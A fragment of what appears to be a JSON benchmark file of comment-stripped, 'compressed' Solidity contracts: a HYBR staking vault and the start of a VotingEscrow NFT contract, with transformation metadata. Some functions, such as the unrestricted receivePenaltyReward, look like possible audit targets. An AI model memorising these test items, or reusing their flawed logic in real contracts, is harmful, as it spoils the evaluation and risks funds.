{\nrequire(_rewardsDistributor != address(0), \"Invalid rewards distributor\");\nrewardsDistributor = _rewardsDistributor;\n}\nfunction setGaugeManager(address _gaugeManager) external onlyOwner {\nrequire(_gaugeManager != address(0), \"Invalid gauge manager\");\ngaugeManager = _gaugeManager;\n}\nmodifier onlyOperator() {\nif (msg.sender != operator) {\nrevert NOT_AUTHORIZED();\n}\n_;\n}\nfunction deposit(uint256 amount, address recipient) external nonReentrant {\nrequire(amount > 0, \"Zero amount\");\nrecipient = recipient == address(0) ? msg.sender : recipient;\nIERC20(HYBR).transferFrom(msg.sender, address(this), amount);\nif (veTokenId == 0) {\n_initializeVeNFT(amount);\n} else {\nIERC20(HYBR).approve(votingEscrow, amount);\nIVotingEscrow(votingEscrow).deposit_for(veTokenId, amount);\n_extendLockToMax();\n}\nuint256 shares = calculateShares(amount);\n_mint(recipient, shares);\n_addTransferLock(recipient, shares);\nemit Deposit(msg.sender, amount, shares);\n}\nfunction withdraw(uint256 shares) external nonReentrant returns (uint256 userTokenId) {\nrequire(shares > 0, \"Zero shares\");\nrequire(balanceOf(msg.sender) >= shares, \"Insufficient balance\");\nrequire(veTokenId != 0, \"No veNFT initialized\");\nrequire(IVotingEscrow(votingEscrow).voted(veTokenId) == false, \"Cannot withdraw yet\");\nuint256 epochStart = HybraTimeLibrary.epochStart(block.timestamp);\nuint256 epochNext = HybraTimeLibrary.epochNext(block.timestamp);\nrequire(block.timestamp >= epochStart + head_not_withdraw_time && block.timestamp < epochNext - tail_not_withdraw_time, \"Cannot withdraw yet\");\nuint256 hybrAmount = calculateAssets(shares);\nrequire(hybrAmount > 0, \"No assets to withdraw\");\nuint256 feeAmount = 0;\nif (withdrawFee > 0) {\nfeeAmount = (hybrAmount * withdrawFee) / BASIS;\n}\nuint256 userAmount = hybrAmount - feeAmount;\nrequire(userAmount > 0, \"Amount too small after fee\");\nuint256 veBalance = totalAssets();\nrequire(hybrAmount <= veBalance, \"Insufficient veNFT balance\");\nuint256 remainingAmount = veBalance - userAmount - feeAmount;\nrequire(remainingAmount >= 0, \"Cannot withdraw entire veNFT\");\n_burn(msg.sender, shares);\nuint256[] memory amounts = new uint256[](3);\namounts[0] = remainingAmount;\namounts[1] = userAmount;\namounts[2] = feeAmount;\nuint256[] memory newTokenIds = IVotingEscrow(votingEscrow).multiSplit(veTokenId, amounts);\nveTokenId = newTokenIds[0];\nuserTokenId = newTokenIds[1];\nuint256 feeTokenId = newTokenIds[2];\nIVotingEscrow(votingEscrow).safeTransferFrom(address(this), msg.sender, userTokenId);\nIVotingEscrow(votingEscrow).safeTransferFrom(address(this), Team, feeTokenId);\nemit Withdraw(msg.sender, shares, userAmount, feeAmount);\n}\nfunction _initializeVeNFT(uint256 initialAmount) internal {\nIERC20(HYBR).approve(votingEscrow, type(uint256).max);\nuint256 lockTime = HybraTimeLibrary.MAX_LOCK_DURATION;\nveTokenId = IVotingEscrow(votingEscrow).create_lock_for(initialAmount, lockTime, address(this));\n}\nfunction calculateShares(uint256 amount) public view returns (uint256) {\nuint256 _totalSupply = totalSupply();\nuint256 _totalAssets = totalAssets();\nif (_totalSupply == 0 || _totalAssets == 0) {\nreturn amount;\n}\nreturn (amount * _totalSupply) / _totalAssets;\n}\nfunction calculateAssets(uint256 shares) public view returns (uint256) {\nuint256 _totalSupply = totalSupply();\nif (_totalSupply == 0) {\nreturn shares;\n}\nreturn (shares * totalAssets()) / _totalSupply;\n}\nfunction totalAssets() public view returns (uint256) {\nif (veTokenId == 0) {\nreturn 0;\n}\nIVotingEscrow.LockedBalance memory locked = IVotingEscrow(votingEscrow).locked(veTokenId);\nreturn uint256(int256(locked.amount));\n}\nfunction _addTransferLock(address user, uint256 amount) internal {\nuint256 unlockTime = block.timestamp + transferLockPeriod;\nuserLocks[user].push(UserLock({\namount: amount,\nunlockTime: unlockTime\n}));\nlockedBalance[user] += amount;\n}\nfunction previewAvailable(address user) external view returns (uint256 available) {\nuint256 totalBalance = balanceOf(user);\nuint256 currentLocked = 0;\nUserLock[] storage arr = userLocks[user];\nfor (uint256 i = 0; i < arr.length; i++) {\nif (arr[i].unlockTime > block.timestamp) {\ncurrentLocked += arr[i].amount;\n}\n}\nreturn totalBalance > currentLocked ? totalBalance - currentLocked : 0;\n}\nfunction _cleanExpired(address user) internal returns (uint256 freed) {\nUserLock[] storage arr = userLocks[user];\nuint256 len = arr.length;\nif (len == 0) return 0;\nuint256 write = 0;\nunchecked {\nfor (uint256 i = 0; i < len; i++) {\nUserLock memory L = arr[i];\nif (L.unlockTime <= block.timestamp) {\nfreed += L.amount;\n} else {\nif (write != i) arr[write] = L;\nwrite++;\n}\n}\nif (freed > 0) {\nlockedBalance[user] -= freed;\n}\nwhile (arr.length > write) {\narr.pop();\n}\n}\n}\nfunction _beforeTokenTransfer(\naddress from,\naddress to,\nuint256 amount\n) internal override {\nsuper._beforeTokenTransfer(from, to, amount);\nif (from != address(0) && to != address(0)) {\nuint256 totalBalance = balanceOf(from);\nuint256 currentAvailable = totalBalance > lockedBalance[from] ? totalBalance - lockedBalance[from] : 0;\nif (currentAvailable >= amount) {\nreturn;\n}\n_cleanExpired(from);\nuint256 finalAvailable = totalBalance > lockedBalance[from] ? totalBalance - lockedBalance[from] : 0;\nrequire(finalAvailable >= amount, \"Tokens locked\");\n}\n}\nfunction claimRewards() external onlyOperator {\nrequire(voter != address(0), \"Voter not set\");\nrequire(rewardsDistributor != address(0), \"Distributor not set\");\nuint256 rebaseAmount = IRewardsDistributor(rewardsDistributor).claim(veTokenId);\nrebase += rebaseAmount;\naddress[] memory votedPools = IVoter(voter).poolVote(veTokenId);\nfor (uint256 i = 0; i < votedPools.length; i++) {\nif (votedPools[i] != address(0)) {\naddress gauge = IGaugeManager(gaugeManager).gauges(votedPools[i]);\nif (gauge != address(0)) {\naddress[] memory bribes = new address[](1);\naddress[][] memory tokens = new address[][](1);\naddress internalBribe = IGaugeManager(gaugeManager).internal_bribes(gauge);\nif (internalBribe != address(0)) {\nuint256 tokenCount = IBribe(internalBribe).rewardsListLength();\nif (tokenCount > 0) {\naddress[] memory bribeTokens = new address[](tokenCount);\nfor (uint256 j = 0; j < tokenCount; j++) {\nbribeTokens[j] = IBribe(internalBribe).bribeTokens(j);\n}\nbribes[0] = internalBribe;\ntokens[0] = bribeTokens;\nIGaugeManager(gaugeManager).claimBribes(bribes, tokens, veTokenId);\n}\n}\naddress externalBribe = IGaugeManager(gaugeManager).external_bribes(gauge);\nif (externalBribe != address(0)) {\nuint256 tokenCount = IBribe(externalBribe).rewardsListLength();\nif (tokenCount > 0) {\naddress[] memory bribeTokens = new address[](tokenCount);\nfor (uint256 j = 0; j < tokenCount; j++) {\nbribeTokens[j] = IBribe(externalBribe).bribeTokens(j);\n}\nbribes[0] = externalBribe;\ntokens[0] = bribeTokens;\nIGaugeManager(gaugeManager).claimBribes(bribes, tokens, veTokenId);\n}\n}\n}\n}\n}\n}\nfunction executeSwap(ISwapper.SwapParams calldata _params) external nonReentrant onlyOperator {\nrequire(address(swapper) != address(0), \"Swapper not set\");\nuint256 tokenBalance = IERC20(_params.tokenIn).balanceOf(address(this));\nrequire(tokenBalance >= _params.amountIn, \"Insufficient token balance\");\nIERC20(_params.tokenIn).safeApprove(address(swapper), _params.amountIn);\nuint256 hybrReceived = swapper.swapToHYBR(_params);\nIERC20(_params.tokenIn).safeApprove(address(swapper), 0);\nvotingYield += hybrReceived;\n}\nfunction compound() external onlyOperator {\nuint256 hybrBalance = IERC20(HYBR).balanceOf(address(this));\nif (hybrBalance > 0) {\nIERC20(HYBR).safeApprove(votingEscrow, hybrBalance);\nIVotingEscrow(votingEscrow).deposit_for(veTokenId, hybrBalance);\n_extendLockToMax();\nlastCompoundTime = block.timestamp;\nemit Compound(hybrBalance, totalAssets());\n}\n}\nfunction vote(address[] calldata _poolVote, uint256[] calldata _weights) external {\nrequire(msg.sender == owner() || msg.sender == operator, \"Not authorized\");\nrequire(voter != address(0), \"Voter not set\");\nIVoter(voter).vote(veTokenId, _poolVote, _weights);\nlastVoteEpoch = HybraTimeLibrary.epochStart(block.timestamp);\n}\nfunction reset() external {\nrequire(msg.sender == owner() || msg.sender == operator, \"Not authorized\");\nrequire(voter != address(0), \"Voter not set\");\nIVoter(voter).reset(veTokenId);\n}\nfunction receivePenaltyReward(uint256 amount) external {\nif (amount > 0) {\nIERC20(HYBR).approve(votingEscrow, amount);\nif(veTokenId == 0){\n_initializeVeNFT(amount);\n} else{\nIVotingEscrow(votingEscrow).deposit_for(veTokenId, amount);\n_extendLockToMax();\n}\n}\npenalty += amount;\nemit PenaltyRewardReceived(amount);\n}\nfunction setVoter(address _voter) external onlyOwner {\nrequire(_voter != address(0), \"Invalid voter\");\nvoter = _voter;\nemit VoterSet(_voter);\n}\nfunction setTransferLockPeriod(uint256 _period) external onlyOwner {\nrequire(_period >= MIN_LOCK_PERIOD && _period <= MAX_LOCK_PERIOD, \"Invalid period\");\nuint256 oldPeriod = transferLockPeriod;\ntransferLockPeriod = _period;\nemit TransferLockPeriodUpdated(oldPeriod, _period);\n}\nfunction setWithdrawFee(uint256 _fee) external onlyOwner {\nrequire(_fee >= MIN_WITHDRAW_FEE && _fee <= MAX_WITHDRAW_FEE, \"Invalid fee\");\nwithdrawFee = _fee;\n}\nfunction setHeadNotWithdrawTime(uint256 _time) external onlyOwner {\nhead_not_withdraw_time = _time;\n}\nfunction setTailNotWithdrawTime(uint256 _time) external onlyOwner {\ntail_not_withdraw_time = _time;\n}\nfunction setSwapper(address _swapper) external onlyOwner {\nrequire(_swapper != address(0), \"Invalid swapper\");\naddress oldSwapper = address(swapper);\nswapper = ISwapper(_swapper);\nemit SwapperUpdated(oldSwapper, _swapper);\n}\nfunction setTeam(address _team) external onlyOwner {\nrequire(_team != address(0), \"Invalid team\");\nTeam = _team;\n}\nfunction emergencyUnlock(address user) external onlyOperator {\ndelete userLocks[user];\nlockedBalance[user] = 0;\nemit EmergencyUnlock(user);\n}\nfunction getUserLocks(address user) external view returns (UserLock[] memory) {\nreturn userLocks[user];\n}\nfunction setOperator(address _operator) external onlyOwner {\nrequire(_operator != address(0), \"Invalid operator\");\naddress oldOperator = operator;\noperator = _operator;\nemit OperatorUpdated(oldOperator, _operator);\n}\nfunction getLockEndTime() external view returns (uint256) {\nif (veTokenId == 0) {\nreturn 0;\n}\nIVotingEscrow.LockedBalance memory locked = IVotingEscrow(votingEscrow).locked(veTokenId);\nreturn uint256(locked.end);\n}\nfunction _extendLockToMax() internal {\nif (veTokenId == 0) return;\nIVotingEscrow.LockedBalance memory locked = IVotingEscrow(votingEscrow).locked(veTokenId);\nif (locked.isPermanent || locked.end <= block.timestamp) return;\nuint256 maxUnlockTime = ((block.timestamp + HybraTimeLibrary.MAX_LOCK_DURATION) / HybraTimeLibrary.WEEK) * HybraTimeLibrary.WEEK;\nif (maxUnlockTime > locked.end + 2 hours) {\ntry IVotingEscrow(votingEscrow).increase_unlock_time(veTokenId, HybraTimeLibrary.MAX_LOCK_DURATION) {\n} catch {\n}\n}\n}\n}",
      "rename_map": {},
      "changes": [
        "Applied compressed formatting"
      ],
      "stats": {
        "comments_removed": true,
        "blank_lines_removed": 110,
        "mode": "compressed",
        "original_lines": 616,
        "transformed_lines": 367,
        "original_chars": 23018,
        "transformed_chars": 13618,
        "compression_ratio": 0.59
      },
      "error": null
    },
    {
      "original_id": "sn_gs_009",
      "transformed_id": "ss_l1_compressed_sn_gs_009",
      "level": "l1",
      "variant": "compressed",
      "source": "sanitized",
      "success": true,
      "code": "pragma solidity 0.8.13;\nimport {IERC721, IERC721Metadata} from \"@openzeppelin/contracts/token/ERC721/extensions/IERC721Metadata.sol\";\nimport {IERC721Receiver} from \"@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol\";\nimport {IERC20} from \"./interfaces/IERC20.sol\";\nimport \"./interfaces/IHybra.sol\";\nimport {IHybraVotes} from \"./interfaces/IHybraVotes.sol\";\nimport {IVeArtProxy} from \"./interfaces/IVeArtProxy.sol\";\nimport {IVotingEscrow} from \"./interfaces/IVotingEscrow.sol\";\nimport {IVoter} from \"./interfaces/IVoter.sol\";\nimport {HybraTimeLibrary} from \"./libraries/HybraTimeLibrary.sol\";\nimport {VotingDelegationLib} from \"./libraries/VotingDelegationLib.sol\";\nimport {VotingBalanceLogic} from \"./libraries/VotingBalanceLogic.sol\";\ncontract VotingEscrow is IERC721, IERC721Metadata, IHybraVotes {\nenum DepositType {\nDEPOSIT_FOR_TYPE,\nCREATE_LOCK_TYPE,\nINCREASE_LOCK_AMOUNT,\nINCREASE_UNLOCK_TIME\n}\nevent Deposit(\naddress indexed provider,\nuint tokenId,\nuint value,\nuint indexed locktime,\nDepositType deposit_type,\nuint ts\n);\nevent Merge(\naddress indexed _sender,\nuint256 indexed _from,\nuint256 indexed _to,\nuint256 _amountFrom,\nuint256 _amountTo,\nuint256 _amountFinal,\nuint256 _locktime,\nuint256 _ts\n);\nevent Split(\nuint256 indexed _from,\nuint256 indexed _tokenId1,\nuint256 indexed _tokenId2,\naddress _sender,\nuint256 _splitAmount1,\nuint256 _splitAmount2,\nuint256 _locktime,\nuint256 _ts\n);\nevent MultiSplit(\nuint256 indexed _from,\nuint256[] _newTokenIds,\naddress _sender,\nuint256[] _amounts,\nuint256 _locktime,\nuint256 _ts\n);\nevent MetadataUpdate(uint256 _tokenId);\nevent BatchMetadataUpdate(uint256 _fromTokenId, uint256 _toTokenId);\nevent Withdraw(address indexed provider, uint tokenId, uint value, uint ts);\nevent LockPermanent(address indexed _owner, uint256 indexed _tokenId, uint256 amount, uint256 _ts);\nevent UnlockPermanent(address indexed _owner, uint256 indexed _tokenId, uint256 amount, uint256 _ts);\nevent Supply(uint prevSupply, uint supply);\naddress public immutable token;\naddress public voter;\naddress public team;\naddress public artProxy;\nuint public PRECISISON = 10000;\nmapping(bytes4 => bool) internal supportedInterfaces;\nmapping(uint => bool) internal isPartnerVeNFT;\nbytes4 internal constant ERC165_INTERFACE_ID = 0x01ffc9a7;\nbytes4 internal constant ERC721_INTERFACE_ID = 0x80ac58cd;\nbytes4 internal constant ERC721_METADATA_INTERFACE_ID = 0x5b5e139f;\nuint internal tokenId;\nuint internal WEEK;\nuint internal MAXTIME;\nint128 internal iMAXTIME;\nIHybra public _hybr;\nVotingDelegationLib.Data private cpData;\nVotingBalanceLogic.Data private votingBalanceLogicData;\nconstructor(address token_addr, address art_proxy) {\ntoken = token_addr;\nvoter = msg.sender;\nteam = msg.sender;\nartProxy = art_proxy;\nWEEK = HybraTimeLibrary.WEEK;\nMAXTIME = HybraTimeLibrary.MAX_LOCK_DURATION;\niMAXTIME = int128(int256(HybraTimeLibrary.MAX_LOCK_DURATION));\nvotingBalanceLogicData.point_history[0].blk = block.number;\nvotingBalanceLogicData.point_history[0].ts = block.timestamp;\nsupportedInterfaces[ERC165_INTERFACE_ID] = true;\nsupportedInterfaces[ERC721_INTERFACE_ID] = true;\nsupportedInterfaces[ERC721_METADATA_INTERFACE_ID] = true;\n_hybr = IHybra(token);\nemit Transfer(address(0), address(this), tokenId);\nemit Transfer(address(this), address(0), tokenId);\n}\nuint8 internal constant _not_entered = 1;\nuint8 internal constant _entered = 2;\nuint8 internal _entered_state = 1;\nmodifier nonreentrant() {\nrequire(_entered_state == _not_entered);\n_entered_state = _entered;\n_;\n_entered_state = _not_entered;\n}\nmodifier notPartnerNFT(uint256 _tokenId) {\nrequire(!isPartnerVeNFT[_tokenId], \"PNFT\");\n_;\n}\nmodifier splitAllowed(uint _from) {\nrequire(canSplit[msg.sender] || canSplit[address(0)], \"!SPLIT\");\nrequire(attachments[_from] == 0 && !voted[_from], \"ATT\");\nrequire(_isApprovedOrOwner(msg.sender, _from), \"NAO\");\n_;\n}\nstring constant public name = \"veHYBR\";\nstring constant public symbol = \"veHYBR\";\nstring constant public version = \"1.0.0\";\nuint8 constant public decimals = 18;\nfunction setTeam(address _team) external {\nrequire(msg.sender == team);\nteam = _team;\n}\nfunction setArtProxy(address _proxy) external {\nrequire(msg.sender == team);\nartProxy = _proxy;\nemit BatchMetadataUpdate(0, type(uint256).max);\n}\nfunction setPartnerVeNFT(uint _tokenId, bool _isPartner) external {\nrequire(msg.sender == team, \"NA\");\nrequire(idToOwner[_tokenId] != address(0), \"DNE\");\nisPartnerVeNFT[_tokenId] = _isPartner;\n}\nfunction tokenURI(uint _tokenId) external view returns (string memory) {\nrequire(idToOwner[_tokenId] != address(0), \"DNE\");\nIVotingEscrow.LockedBalance memory _locked = locked[_tokenId];\nreturn IVeArtProxy(artProxy)._tokenURI(_tokenId,VotingBalanceLogic.balanceOfNFT(_tokenId, block.timestamp, votingBalanceLogicData),_locked.end,uint(int256(_locked.amount)));\n}\nmapping(uint => address) internal idToOwner;\nmapping(address => uint) internal ownerToNFTokenCount;\nfunction ownerOf(uint _tokenId) public view returns (address) {\nreturn idToOwner[_tokenId];\n}\nfunction ownerToNFTokenCountFn(address owner) public view returns (uint) {\nreturn ownerToNFTokenCount[owner];\n}\nfunction _balance(address _owner) internal view returns (uint) {\nreturn ownerToNFTokenCount[_owner];\n}\nfunction balanceOf(address _owner) external view returns (uint) {\nreturn _balance(_owner);\n}\nmapping(uint => address) internal idToApprovals;\nmapping(address => mapping(address => bool)) internal ownerToOperators;\nmapping(uint => uint) public ownership_change;\nfunction getApproved(uint _tokenId) external view returns (address) {\nreturn idToApprovals[_tokenId];\n}\nfunction isApprovedForAll(address _owner, address _operator) external view returns (bool) {\nreturn (ownerToOperators[_owner])[_operator];\n}\nfunction approve(address _approved, uint _tokenId) public {\naddress owner = idToOwner[_tokenId];\nrequire(owner != address(0), \"ZA\");\nrequire(_approved != owner, \"IA\");\nbool senderIsOwner = (idToOwner[_tokenId] == msg.sender);\nbool senderIsApprovedForAll = (ownerToOperators[owner])[msg.sender];\nrequire(senderIsOwner || senderIsApprovedForAll, \"NAO\");\nidToApprovals[_tokenId] = _approved;\nemit Approval(owner, _approved, _tokenId);\n}\nfunction setApprovalForAll(address _operator, bool _approved) external {\nassert(_operator != msg.sender);\nownerToOperators[msg.sender][_operator] = _approved;\nemit ApprovalForAll(msg.sender, _operator, _approved);\n}\nfunction _clearApproval(address _owner, uint _tokenId) internal {\nassert(idToOwner[_tokenId] == _owner);\nif (idToApprovals[_tokenId] != address(0)) {\nidToApprovals[_tokenId] = address(0);\n}\n}\nfunction _isApprovedOrOwner(address _spender, uint _tokenId) internal view returns (bool) {\naddress owner = idToOwner[_tokenId];\nbool spenderIsOwner = owner == _spender;\nbool spenderIsApproved = _spender == idToApprovals[_tokenId];\nbool spenderIsApprovedForAll = (ownerToOperators[owner])[_spender];\nreturn spenderIsOwner || spenderIsApproved || spenderIsApprovedForAll;\n}\nfunction isApprovedOrOwner(address _spender, uint _tokenId) external view returns (bool) {\nreturn _isApprovedOrOwner(_spender, _tokenId);\n}\nfunction _transferFrom(\naddress _from,\naddress _to,\nuint _tokenId,\naddress _sender\n) internal notPartnerNFT(_tokenId) {\nrequire(attachments[_tokenId] == 0 && !voted[_tokenId], \"ATT\");\nrequire(_isApprovedOrOwner(_sender, _tokenId), \"NAO\");\n_clearApproval(_from, _tokenId);\n_removeTokenFrom(_from, _tokenId);\nVotingDelegationLib.moveTokenDelegates(cpData, delegates(_from), delegates(_to), _tokenId, ownerOf);\n_addTokenTo(_to, _tokenId);\nownership_change[_tokenId] = block.number;\nemit Transfer(_from, _to, _tokenId);\n}\nfunction transferFrom(\naddress _from,\naddress _to,\nuint _tokenId\n) external {\n_transferFrom(_from, _to, _tokenId, msg.sender);\n}\nfunction safeTransferFrom(\naddress _from,\naddress _to,\nuint _tokenId\n) external {\nsafeTransferFrom(_from, _to, _tokenId, \"\");\n}\nfunction _isContract(address account) internal view returns (bool) {\nuint size;\nassembly {\nsize := extcodesize(account)\n}\nreturn size > 0;\n}\nfunction safeTransferFrom(\naddress _from,\naddress _to,\nuint _tokenId,\nbytes memory _data\n) public {\n_transferFrom(_from, _to, _tokenId, msg.sender);\nif (_isContract(_to)) {\ntry IERC721Receiver(_to).onERC721Received(msg.sender, _from, _tokenId, _data) returns (bytes4 response) {\nif (response != IERC721Receiver(_to).onERC721Received.selector) {\nrevert(\"E721_RJ\");\n}\n} catch (bytes memory reason) {\nif (reason.length == 0) {\nrevert('E721_NRCV');\n} else {\nassembly {\nrevert(add(32, reason), mload(reason))\n}\n}\n}\n}\n}\nfunction supportsInterface(bytes4 _interfaceID) external view returns (bool) {\nreturn supportedInterfaces[_interfaceID];\n}\nmapping(address => mapping(uint => uint)) internal ownerToNFTokenIdList;\nmapping(uint => uint) internal tokenToOwnerIndex;\nfunction tokenOfOwnerByIndex(address _owner, uint _tokenIndex) public view returns (uint) {\nreturn ownerToNFTokenIdList[_owner][_tokenIndex];\n}\nfunction _addTokenToOwnerList(address _to, uint _tokenId) internal {\nuint current_count = _balance(_to);\nownerToNFTokenIdList[_to][current_count] = _tokenId;\ntokenToOwnerIndex[_tokenId] = current_count;\n}\nfunction _addTokenTo(address _to, uint _tokenId) internal {\nassert(idToOwner[_tokenId] == address(0));\nidToOwner[_tokenId] = _to;\n_addTokenToOwnerList(_to, _tokenId);\nownerToNFTokenCount[_to] += 1;\n}\nfunction _mint(address _to, uint _tokenId) internal returns (bool) {\nassert(_to != address(0));\nVotingDelegationLib.moveTokenDelegates(cpData, address(0), delegates(_to), _tokenId, ownerOf);\n_addTokenTo(_to, _tokenId);\nemit Transfer(address(0), _to, _tokenId);\nreturn true;\n}\nfunction _removeTokenFromOwnerList(address _from, uint _tokenId) internal {\nuint current_count = _balance(_from) - 1;\nuint current_index = tokenToOwnerIndex[_tokenId];\nif (current_count == current_index) {\nownerToNFTokenIdList[_from][current_count] = 0;\ntokenToOwnerIndex[_tokenId] = 0;\n} else {\nuint lastTokenId = ownerToNFTokenIdList[_from][current_count];\nownerToNFTokenIdList[_from][current_index] = lastTokenId;\ntokenToOwnerIndex[lastTokenId] = current_index;\nownerToNFTokenIdList[_from][current_count] = 0;\ntokenToOwnerIndex[_tokenId] = 0;\n}\n}\nfunction _removeTokenFrom(address _from, uint _tokenId) internal {\nassert(idToOwner[_tokenId] == _from);\nidToOwner[_tokenId] = address(0);\n_removeTokenFromOwnerList(_from, _tokenId);\nownerToNFTokenCount[_from] -= 1;\n}\nfunction _burn(uint _tokenId) internal {\nrequire(_isApprovedOrOwner(msg.sender, _tokenId), \"NAO\");\naddress owner = ownerOf(_tokenId);\ndelete idToApprovals[_tokenId];\n_removeTokenFrom(owner, _tokenId);\nVotingDelegationLib.moveTokenDelegates(cpData, delegates(owner), address(0), _tokenId, ownerOf);\nemit Transfer(owner, address(0), _tokenId);\n}\nmapping(uint => IVotingEscrow.LockedBalance) public locked;\nuint public permanentLockBalance;\nuint public epoch;\nmapping(uint => int128) public slope_changes;\nuint public supply;\nmapping(address => bool) public canSplit;\nuint internal constant MULTIPLIER = 1 ether;\nfunction get_last_user_slope(uint _tokenId) external view returns (int128) {\nuint uepoch = votingBalanceLogicData.user_point_epoch[_tokenId];\nreturn votingBalanceLogicData.user_point_history[_tokenId][uepoch].slope;\n}\nfunction user_point_history(uint _tokenId, uint _idx) external view returns (IVotingEscrow.Point memory) {\nreturn votingBalanceLogicData.user_point_history[_tokenId][_idx];\n}\nfunction point_history(uint epoch) external view returns (IVotingEscrow.Point memory) {\nreturn votingBalanceLogicData.point_history[epoch];\n}\nfunction user_point_epoch(uint tokenId) external view returns (uint) {\nreturn votingBalanceLogicData.user_point_epoch[tokenId];\n}\nfunction _checkpoint(\nuint _tokenId,\nIVotingEscrow.LockedBalance memory old_locked,\nIVotingEscrow.LockedBalance memory new_locked\n) internal {\nIVotingEscrow.Point memory u_old;\nIVotingEscrow.Point memory u_new;\nint128 old_dslope = 0;\nint128 new_dslope = 0;\nuint _epoch = epoch;\nif (_tokenId != 0) {\nu_new.permanent = 0;\nif(new_locked.isPermanent){\nu_new.permanent = uint(int256(new_locked.amount));\n}\nif (old_locked.end > block.timestamp && old_locked.amount > 0) {\nu_old.slope = old_locked.amount / iMAXTIME;\nu_old.bias = u_old.slope * int128(int256(old_locked.end - block.timestamp));\n}\nif (new_locked.end > block.timestamp && new_locked.amount > 0) {\nu_new.slope = new_locked.amount / iMAXTIME;\nu_new.bias = u_new.slope * int128(int256(new_locked.end - block.timestamp));\n}\nold_dslope = slope_changes[old_locked.end];\nif (new_locked.end != 0) {\nif (new_locked.end == old_locked.end) {\nnew_dslope = old_dslope;\n} else {\nnew_dslope = slope_changes[new_locked.end];\n}\n}\n}\nIVotingEscrow.Point memory last_point = IVotingEscrow.Point({bias: 0, slope: 0, ts: block.timestamp, blk: block.number, permanent: 0});\nif (_epoch > 0) {\nlast_point = votingBalanceLogicData.point_history[_epoch];\n}\nuint last_checkpoint = last_point.ts;\nIVotingEscrow.Point memory initial_last_point = last_point;\nuint block_slope = 0;\nif (block.timestamp > last_point.ts) {\nblock_slope = (MULTIPLIER * (block.number - last_point.blk)) / (block.timestamp - last_point.ts);\n}\n{\nuint t_i = (last_checkpoint / WEEK) * WEEK;\nfor (uint i = 0; i < 255; ++i) {\nt_i += WEEK;\nint128 d_slope = 0;\nif (t_i > block.timestamp) {\nt_i = block.timestamp;\n} else {\nd_slope = slope_changes[t_i];\n}\nlast_point.bias -= last_point.slope * int128(int256(t_i - last_checkpoint));\nlast_point.slope += d_slope;\nif (last_point.bias < 0) {\nlast_point.bias = 0;\n}\nif (last_point.slope < 0) {\nlast_point.slope = 0;\n}\nlast_checkpoint = t_i;\nlast_point.ts = t_i;\nlast_point.blk = initial_last_point.blk + (block_slope * (t_i - initial_last_point.ts)) / MULTIPLIER;\n_epoch += 1;\nif (t_i == block.timestamp) {\nlast_point.blk = block.number;\nbreak;\n} else {\nvotingBalanceLogicData.point_history[_epoch] = last_point;\n}\n}\n}\nepoch = _epoch;\nif (_tokenId != 0) {\nlast_point.slope += (u_new.slope - u_old.slope);\nlast_point.bias += (u_new.bias - u_old.bias);\nif (last_point.slope < 0) {\nlast_point.slope = 0;\n}\nif (last_point.bias < 0) {\nlast_point.bias = 0;\n}\nlast_point.permanent = permanentLockBalance;\n}\nvotingBalanceLogicData.point_history[_epoch] = last_point;\nif (_tokenId != 0) {\nif (old_locked.end > block.timestamp) {\nold_dslope += u_old.slope;\nif (new_locked.end == old_locked.end) {\nold_dslope -= u_new.slope;\n}\nslope_changes[old_locked.end] = old_dslope;\n}\nif (new_locked.end > block.timestamp) {\nif (new_locked.end > old_locked.end) {\nnew_dslope -= u_new.slope;\nslope_changes[new_locked.end] = new_dslope;\n}\n}\nuint user_epoch = votingBalanceLogicData.user_point_epoch[_tokenId] + 1;\nvotingBalanceLogicData.user_point_epoch[_tokenId] = user_epoch;\nu_new.ts = block.timestamp;\nu_new.blk = block.number;\nvotingBalanceLogicData.user_point_history[_tokenId][user_epoch] = u_new;\n}\n}\nfunction _deposit_for(\nuint _tokenId,\nuint _value,\nuint unlock_time,\nIVotingEscrow.LockedBalance memory locked_balance,\nDepositType deposit_type\n) internal {\nIVotingEscrow.LockedBalance memory _locked = locked_balance;\nuint supply_before = supply;\nsupply = supply_before + _value;\nIVotingEscrow.LockedBalance memory old_locked;\n(old_locked.amount, old_locked.end, old_locked.isPermanent) = (_locked.amount, _locked.end, _locked.isPermanent);\n_locked.amount += int128(int256(_value));\nif (unlock_time != 0) {\n_locked.end = unlock_time;\n}\nlocked[_tokenId] = _locked;\n_checkpoint(_tokenId, old_locked, _locked);\naddress from = msg.sender;\nif (_value != 0) {\nassert(IERC20(token).transferFrom(from, address(this), _value));\n}\nemit Deposit(from, _tokenId, _value, _locked.end, deposit_type, block.timestamp);\nemit Supply(supply_before, supply_before + _value);\n}\nfunction checkpoint() external {\n_checkpoint(0, IVotingEscrow.LockedBalance(0, 0, false), IVotingEscrow.LockedBalance(0, 0, false));\n}\nfunction deposit_for(uint _tokenId, uint _value) external nonreentrant {\nIVotingEscrow.LockedBalance memory _locked = locked[_tokenId];\nrequire(_value > 0, \"ZV\");\nrequire(_locked.amount > 0, 'ZL');\nrequire(_locked.end > block.timestamp || _locked.isPermanent, 'EXP');\nif (_locked.isPermanent) permanentLockBalance += _value;\n_deposit_for(_tokenId, _value, 0, _locked, DepositType.DEPOSIT_FOR_TYPE);\nif(voted[_tokenId]) {\nIVoter(voter).poke(_tokenId);\n}\n}\nfunction _create_lock(uint _value, uint _lock_duration, address _to) internal returns (uint) {\nuint unlock_time = (block.timestamp + _lock_duration) / WEEK * WEEK;\nrequire(_value > 0, \"ZV\");\nrequire(unlock_time > block.timestamp && (unlock_time <= block.timestamp + MAXTIME), 'IUT');\n++tokenId;\nuint _tokenId = tokenId;\n_mint(_to, _tokenId);\nIVotingEscrow.LockedBalance memory _locked = locked[_tokenId];\n_deposit_for(_tokenId, _value, unlock_time, _locked, DepositType.CREATE_LOCK_TYPE);\nreturn _tokenId;\n}\nfunction create_lock(uint _value, uint _lock_duration) external nonreentrant returns (uint) {\nreturn _create_lock(_value, _lock_duration, msg.sender);\n}\nfunction create_lock_for(uint _value, uint _lock_duration, address _to) external nonreentrant returns (uint) {\nreturn _create_lock(_value, _lock_duration, _to);\n}\nfunction increase_amount(uint _tokenId, uint _value) external nonreentrant {\nassert(_isApprovedOrOwner(msg.sender, _tokenId));\nIVotingEscrow.LockedBalance memory _locked = locked[_tokenId];\nassert(_value > 0);\nrequire(_locked.amount > 0, 'ZL');\nrequire(_locked.end > block.timestamp || _locked.isPermanent, 'EXP');\nif (_locked.isPermanent) permanentLockBalance += _value;\n_deposit_for(_tokenId, _value, 0, _locked, DepositType.INCREASE_LOCK_AMOUNT);\nif(voted[_tokenId]) 